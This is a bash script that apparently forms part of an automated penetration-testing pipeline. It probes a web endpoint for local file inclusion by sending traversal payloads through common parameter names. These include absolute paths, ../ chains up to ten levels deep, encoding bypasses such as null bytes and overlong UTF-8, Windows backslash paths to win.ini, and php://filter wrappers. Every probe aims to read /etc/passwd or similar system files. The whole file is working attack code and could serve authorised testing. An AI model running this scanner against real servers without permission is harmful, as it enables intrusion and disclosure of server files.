#!/bin/bash
# Three-Layer LFI Probe (v4.1): Absolute path -> Relative path depth traversal -> Encoding bypass
# 用法: detect_lfi.sh <ENDPOINT>
set -euo pipefail

ENDPOINT="${1:-http://127.0.0.1:80}"

BASE=$(echo "$ENDPOINT" | sed 's|^\(https\?://[^/]*\).*|\1|')
ENDPOINT_PATH_Q="${ENDPOINT#$BASE}"
ENDPOINT_PATH="${ENDPOINT_PATH_Q%%\?*}"
[ -z "$ENDPOINT_PATH" ] && ENDPOINT_PATH="/"
ENDPOINT_QS="${ENDPOINT_PATH_Q#${ENDPOINT_PATH}}"
ENDPOINT_QS="${ENDPOINT_QS#\?}"

echo "=== LFI Three-Layer Probe (v4.1) ==="
echo "[INFO] ENDPOINT       = $ENDPOINT"
echo "[INFO] BASE           = $BASE"
echo "[INFO] ENDPOINT_PATH  = $ENDPOINT_PATH"
echo "[INFO] ENDPOINT_QS    = $ENDPOINT_QS"

COMMON_PARAMS="page file include path doc folder view content template image"

QS_PARAM=""
if [ -n "$ENDPOINT_QS" ]; then
  QS_PARAM="${ENDPOINT_QS%%=*}"
fi
if [ -n "$QS_PARAM" ]; then
  COMMON_PARAMS="$QS_PARAM $COMMON_PARAMS"
  echo "[INFO] URL query 中发现参数 $QS_PARAM，优先测试"
fi

MOUNTS="$ENDPOINT_PATH /"
if [ "$ENDPOINT_PATH" != "/" ]; then
  DIR_PART=$(dirname "$ENDPOINT_PATH")
  [ "$DIR_PART" != "." ] && [ "$DIR_PART" != "/" ] && MOUNTS="$ENDPOINT_PATH $DIR_PART/ /"
fi
echo "[INFO] 挂载点候选 MOUNTS = $MOUNTS"

PROBE_COUNT=0

try_lfi() {
  local url="$1"
  local label="$2"
  PROBE_COUNT=$((PROBE_COUNT + 1))
  local result
  result=$(curl -s "$url" --max-time 6 2>/dev/null)
  local ec=$?
  local sz=${#result}
  local tail_snip
  tail_snip=$(echo "$result" | tr -d '\r' | tail -c 160 | tr '\n' ' ' | tr -d '\0')
  if echo "$result" | grep -qE '^[a-z_][a-z0-9_-]*:x?:[0-9]+:[0-9]+:'; then
    echo "[$PROBE_COUNT][HIT ] $label exit=$ec size=${sz}B  URL=$url"
    echo "    tail: $tail_snip"
    echo "$result" | head -5
    return 0
  fi
  echo "[$PROBE_COUNT][MISS] $label exit=$ec size=${sz}B  URL=$url"
  echo "    tail: $tail_snip"
  return 1
}

build_url() {
  local mount="$1"
  local param="$2"
  local payload="$3"
  if [ "$mount" = "/" ]; then
    echo "$BASE/?$param=$payload"
  else
    case "$mount" in
      */) echo "$BASE${mount}?$param=$payload" ;;
      *)  echo "$BASE${mount}?$param=$payload" ;;
    esac
  fi
}

echo "--- Layer 1: Absolute path (no traversal) ---"
for mount in $MOUNTS; do
  for param in $COMMON_PARAMS; do
    URL=$(build_url "$mount" "$param" "/etc/passwd")
    if try_lfi "$URL" "ABS mount=$mount param=$param"; then
      echo "LFI_FOUND:$param:0:absolute"
      echo "LFI_MOUNT:$mount"
      echo "{\"event\":\"lfi_param_found\",\"payload\":{\"param\":\"$param\",\"depth\":0,\"style\":\"absolute\",\"confirmed\":true}}"
      exit 0
    fi
  done
done

echo "--- Layer 2: Relative path depth traversal (1-10) ---"
for mount in $MOUNTS; do
  for depth in 1 2 3 4 5 6 7 8 9 10; do
    TRAV=$(printf '../%.0s' $(seq 1 $depth))
    for param in $COMMON_PARAMS; do
      URL=$(build_url "$mount" "$param" "${TRAV}etc/passwd")
      if try_lfi "$URL" "REL mount=$mount depth=$depth param=$param"; then
        echo "LFI_FOUND:$param:$depth:relative"
        echo "LFI_MOUNT:$mount"
        echo "{\"event\":\"lfi_param_found\",\"payload\":{\"param\":\"$param\",\"depth\":$depth,\"style\":\"relative\",\"confirmed\":true}}"
        exit 0
      fi
    done
  done
done

echo "--- Layer 2b: Discovered application paths (recon-fed or fallback) ---"
RECON_PATHS="{recon_discovered_params}"
if [ "$RECON_PATHS" = "{recon_discovered_params}" ] || [ -z "$RECON_PATHS" ]; then
  echo "[INFO] 未从 recon 阶段传入路径，使用 fallback 常见路径"
  RECON_PATHS="/index.php?page= /include.php?file= /view.php?file= /display.php?path= /wp-content/plugins/*/readme.txt?file= /cgi-bin/*.cgi?file= /news.php?article= /blog.php?post="
else
  echo "[INFO] 使用 recon 阶段传入的路径: $RECON_PATHS"
fi
for depth in 1 2 3 4 5 6 7 8 9 10; do
  TRAV=$(printf '../%.0s' $(seq 1 $depth))
  for kpath in $RECON_PATHS; do
    URL="$BASE${kpath}${TRAV}etc/passwd"
      if try_lfi "$URL" "KPATH kpath=$kpath depth=$depth"; then
      echo "LFI_PATH_FOUND:$kpath:$depth"
      echo "{\"event\":\"lfi_param_found\",\"payload\":{\"path\":\"$kpath\",\"depth\":$depth,\"style\":\"relative\",\"confirmed\":true}}"
      exit 0
    fi
  done
done

echo "--- Layer 3a: Encoding bypass (Linux/Unix) ---"
for mount in $MOUNTS; do
  for depth in 1 3 5 7; do
    TRAV=$(printf '../%.0s' $(seq 1 $depth))
    for param in page file include path image; do
      for bypass in \
        "%00" \
        "....//....//....//etc/passwd" \
        "..%252f" \
        "..%c0%af" \
        "..%ef%bc%8f" \
        "/./etc/passwd" \
        "%00.jpg" \
        "%2500"; do
        PAYLOAD="${TRAV}etc/passwd${bypass}"
        case "$bypass" in
          "/./etc/passwd") PAYLOAD="${TRAV}${bypass}" ;;
          *)               PAYLOAD="${TRAV}etc/passwd${bypass}" ;;
        esac
        URL=$(build_url "$mount" "$param" "$PAYLOAD")
        if try_lfi "$URL" "BYPASS mount=$mount depth=$depth param=$param bypass=$bypass"; then
          echo "LFI_BYPASS_FOUND:$param:$depth:$bypass"
          echo "LFI_MOUNT:$mount"
          echo "{\"event\":\"lfi_param_found\",\"payload\":{\"param\":\"$param\",\"depth\":$depth,\"style\":\"bypass\",\"bypass\":\"$bypass\",\"confirmed\":true}}"
          exit 0
        fi
      done
    done
  done
done

echo "--- Layer 3b: Windows/IIS path handling bypass ---"
for mount in $MOUNTS; do
  for depth in 1 3 5; do
    TRAV_UNIX=$(printf '../%.0s' $(seq 1 $depth))
    TRAV_WIN=$(printf '..\\%.0s' $(seq 1 $depth))
    for param in page file include path image; do
      # Windows 反斜杠路径遍历
      URL=$(build_url "$mount" "$param" "${TRAV_WIN}windows\\win.ini")
      if try_lfi "$URL" "WIN-BS mount=$mount depth=$depth param=$param"; then
        echo "LFI_BYPASS_FOUND:$param:$depth:windows_backslash"
        echo "LFI_MOUNT:$mount"
        exit 0
      fi
      # Windows ....\ 绕过（点号混淆）
      WIN_TRAV2=$(printf '....\\%.0s' $(seq 1 $depth))
      URL2=$(build_url "$mount" "$param" "${WIN_TRAV2}windows\\win.ini")
      if try_lfi "$URL2" "WIN-DOT mount=$mount depth=$depth param=$param"; then
        echo "LFI_BYPASS_FOUND:$param:$depth:windows_dotslash"
        echo "LFI_MOUNT:$mount"
        exit 0
      fi
      # Unicode 斜杠绕过 (Tomcat/IIS)
      URL3=$(build_url "$mount" "$param" "${TRAV_UNIX}windows%c0%afwin.ini")
      if try_lfi "$URL3" "WIN-UNICODE mount=$mount depth=$depth param=$param"; then
        echo "LFI_BYPASS_FOUND:$param:$depth:unicode_slash"
        echo "LFI_MOUNT:$mount"
        exit 0
      fi
    done
  done
done

echo "--- Layer 4: PHP wrappers (php://filter base64) ---"
for mount in $MOUNTS; do
  for param in $COMMON_PARAMS; do
    for target in "/etc/passwd" "etc/passwd"; do
      URL=$(build_url "$mount" "$param" "php://filter/convert.base64-encode/resource=$target")
      PROBE_COUNT=$((PROBE_COUNT + 1))
      result=$(curl -s "$URL" --max-time 6 2>/dev/null)
      ec=$?
      sz=${#result}
      decoded=$(echo "$result" | base64 -d 2>/dev/null)
      tail_snip=$(echo "$result" | tr -d '\r' | tail -c 120 | tr '\n' ' ')
      if echo "$decoded" | grep -qE '^[a-z_][a-z0-9_-]*:x?:[0-9]+:[0-9]+:'; then
        echo "[$PROBE_COUNT][HIT ] FILTER mount=$mount param=$param target=$target exit=$ec size=${sz}B"
        echo "    URL: $URL"
        echo "    decoded(head5):"
        echo "$decoded" | head -5
        echo "LFI_FOUND:$param:0:php_filter"
        echo "LFI_MOUNT:$mount"
        echo "{\"event\":\"lfi_param_found\",\"payload\":{\"param\":\"$param\",\"depth\":0,\"style\":\"php_filter\",\"confirmed\":true}}"
        exit 0
      fi
      echo "[$PROBE_COUNT][MISS] FILTER mount=$mount param=$param target=$target exit=$ec size=${sz}B"
      echo "    URL: $URL"
      echo "    tail(raw): $tail_snip"
    done
  done
done

echo "[INFO] 总探测次数: $PROBE_COUNT"
echo "LFI_NOT_FOUND"
